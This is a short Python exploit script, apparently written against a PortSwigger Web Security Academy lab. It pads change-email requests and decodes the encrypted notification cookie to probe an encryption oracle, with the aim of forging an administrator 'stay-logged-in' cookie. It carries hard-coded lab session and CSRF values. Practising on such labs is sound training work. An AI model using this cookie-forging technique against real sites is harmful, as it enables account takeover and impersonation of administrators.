import base64
from urllib.parse import quote, unquote
from bs4 import BeautifulSoup
from base64 import b64decode, b64encode
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import re

import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)

# Constants
SESSION_COOKIE   = "RTOo2jbQrtwyUv0xlzM5j4uq4eFQMAIf"
STAY_LOGGED_IN   = quote("faMqE98YD7upBWrXCedVtle3NDU83OIltHq3Pd59Zp4=")
TARGET_URL       = 'https://0ac500ac04bdc17680abd5960048007f.web-security-academy.net/'
PROXY            = {'https': 'http://localhost:8080'}
MAX_WORKERS      = 1

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)
session.cookies.set("stay-logged-in", STAY_LOGGED_IN)
session.proxies.update(PROXY)
session.verify = False
b64data = '8++dVKsryBgh+F/vxyH/WX0zOcmHOH4ZCke4WTUAuSQ='

for i in range(13, 15):
    print(session.post(f"{TARGET_URL}my-account/change-email", {
        'email': ' ' * i + 'administrator:1773048314770',
        'csrf': 'AJZMJr3YI7XH81NRFXU01vixHVvr0b5a'
    }))
    data = b64decode(unquote(session.cookies.get('notification')))
    
    print(data, len(data))
    print(data[-16:])
data = b64decode(b64data)

print(data)